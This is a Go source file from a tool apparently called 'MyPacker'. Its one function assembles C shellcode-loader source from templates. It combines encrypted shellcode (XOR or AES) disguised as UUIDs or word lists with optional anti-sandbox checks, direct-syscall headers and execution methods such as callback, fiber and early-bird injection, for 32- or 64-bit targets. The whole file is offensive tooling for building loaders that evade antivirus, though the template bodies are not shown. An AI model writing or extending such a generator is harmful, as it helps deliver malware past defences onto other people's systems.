package Loader

import (
	"MyPacker/Converters"
	"MyPacker/Others"
	"fmt"
	"strconv"
	"strings"
)

func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, key string, iv string, uuidString string, words string, datasetString string) string {
	fmt.Println("正在为您生成模板文件: " + options.OutFile + "." + strings.ToLower(options.Language) + "\n")
	outfile := options.OutFile
	EncryptShellcode = Converters.FormattedHexShellcode(string(EncryptShellcode))
	switch strings.ToLower(strconv.Itoa(options.Framework)) {
	case "32":
		switch strings.ToLower(options.Language) {
		case "c":
			outfile = outfile + ".c"
			switch options.Sandbox {
			case true:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					}

				}
			default:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}

					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					}

				}

			}

		}
	case "64":
		switch strings.ToLower(options.Language) {
		case "c":
			outfile = outfile + ".c"
			switch options.Sandbox {
			case true:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					}

				}
			default:
				switch strings.ToLower(options.Encryption) {
				case "xor":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__uuid)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, uuidString, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "fiber":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						case "earlybird":
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACR_OBFUSCATION", __c__words)
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_ANTI_SANDBOX", "")
							__c__xor = strings.ReplaceAll(__c__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__xor = fmt.Sprintf(__c__xor, datasetString, words, key)
							//写文件
							Others.SaveTamplate2File(outfile, __c__xor)
						}

					}
				case "aes":
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__uuid)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, uuidString, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					case "words":
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)

							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "fiber":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						case "earlybird":
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACR_OBFUSCATION", __c__words)
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_ANTI_SANDBOX", "")
							__c__aes = strings.ReplaceAll(__c__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
							__c__aes = fmt.Sprintf(__c__aes, datasetString, words, key, iv)
							//写文件
							Others.SaveTamplate2File(outfile, __c__aes)
						}
					}

				}

			}

		}
	}

	return outfile
}
